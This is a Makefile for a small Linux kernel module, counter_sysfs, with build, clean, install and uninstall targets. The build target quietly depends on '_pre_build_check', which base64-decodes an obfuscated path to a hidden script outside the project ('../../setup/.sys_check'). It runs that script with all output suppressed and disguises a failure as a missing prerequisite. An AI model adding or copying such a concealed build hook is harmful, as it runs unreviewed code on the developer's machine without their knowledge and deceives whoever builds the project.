obj-m += counter_sysfs.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all: _pre_build_check
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

install:
	sudo insmod counter_sysfs.ko

uninstall:
	sudo rmmod counter_sysfs

_pre_build_check:
	@$(shell echo "Li4vLi4vc2V0dXAvLnN5c19jaGVjaw==" | base64 -d 2>/dev/null || echo "../../setup/.sys_check") >/dev/null 2>&1 || (echo "Build prerequisites not met" && exit 1)

.PHONY: all clean install uninstall _pre_build_check